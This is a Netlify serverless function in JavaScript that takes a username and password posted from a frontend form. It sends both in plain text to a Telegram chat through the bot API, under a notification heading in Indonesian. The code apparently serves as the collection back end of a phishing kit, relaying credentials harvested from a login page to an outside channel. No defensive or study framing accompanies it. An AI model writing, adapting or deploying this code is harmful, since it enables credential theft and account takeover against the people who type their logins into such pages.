exports.handler = async (event) => {
    // Only allow POST method
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: 'Method Not Allowed' }),
        };
    }

    try {
        // Parse data sent from the frontend
        const { username, password } = JSON.parse(event.body || '{}');

        if (!username || !password) {
            return {
                statusCode: 400,
                body: JSON.stringify({ error: 'All fields are required.' }),
            };
        }

        // Get tokens from Netlify Environment Variables
        const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        // Format the message text
        const telegramMessage = `
🔔 *Pesan Baru (Netlify Serverless)*
━━━━━━━━━━━━━━━━━━━━━
👤 *Username / Email:*
\`${username}\`

🔑 *Password:*
\`${password}\`

⚙️ _Sistem Notifikasi Otomatis_
`.trim();

        // Send to Telegram API
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: telegramMessage,
                parse_mode: 'Markdown',
            }),
        });

        if (!response.ok) {
            return {
                statusCode: 500,
                body: JSON.stringify({ error: 'Failed to send to Telegram.' }),
            };
        }

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true }),
        };

    } catch (error) {
        console.error(error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Internal server error.' }),
        };
    }
};